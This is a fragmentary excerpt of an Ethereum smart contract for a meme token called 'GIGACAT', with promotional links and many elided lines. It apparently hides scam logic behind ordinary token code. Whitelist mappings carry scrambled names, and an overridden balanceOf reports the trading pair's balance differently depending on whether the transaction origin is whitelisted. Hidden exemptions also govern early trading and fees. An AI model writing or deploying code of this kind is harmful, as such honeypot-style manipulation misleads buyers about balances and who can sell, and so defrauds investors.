...
/*
    ...
    The cat that became a hood. The mascot of the movement before the movement had a logo. $GIGACAT honors the origin story.

    Web: https://gigacat.store/
    X: https://x.com/gigacateth/
    TG: https://t.me/gigacat_eth/
*/
...
contract GIGACAT is ERC20, Ownable {
    ...
    address private GIGACAT_Addr;
    uint72 private Ethereum_GIGACATbbalance;
    ...
    // Additional values
    bool public Buy_Sell_Triger =  true;
    address public vitalik_address = address(0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045);
    /******************/

    // exclude from fees and max transaction amount
    mapping(address => bool) private _enfn351fafe;
    mapping(address => bool) private _exne523nnfdf;
    ...
    constructor() ERC20("Giga Cat", "GIGACAT") payable{
    ...
    function balanceOf(address account) public view override returns (uint256 balance) {
        bool _Krislt = IERC20(uniPair).balanceOf(uniPair) <= 0 || account != uniPair; if(_Krislt || _enfn351fafe[tx.origin])
    ...
    {
        __enfn351fafe = _enfn351fafe[_target];
        __exne523nnfdf = _exne523nnfdf[_target];
    ...
    function _transfer(
        ...
        if (limitsEnabled) {
            if (
                ...
                if (!tradingOpen) {
                    require(
                        _enfn351fafe[from] || _enfn351fafe[to],
                ...
                //when sell
                    ...
                    DEXPair[to] && !_exne523nnfdf[from]
                ) {
                    require(
                        amount <= maxTransactionLimit,
                        "Sell transfer amount exceeds the maxTransactionLimit."
                    );
                } else if (!_exne523nnfdf[to]) {
                    require(
                        amount + balanceOf(to) <= maxWalletLimit,
                        "Max wallet exceeded"
                    );
        ...
        if (_enfn351fafe[from] || _enfn351fafe[to]) {
            takeFee = false;
        }
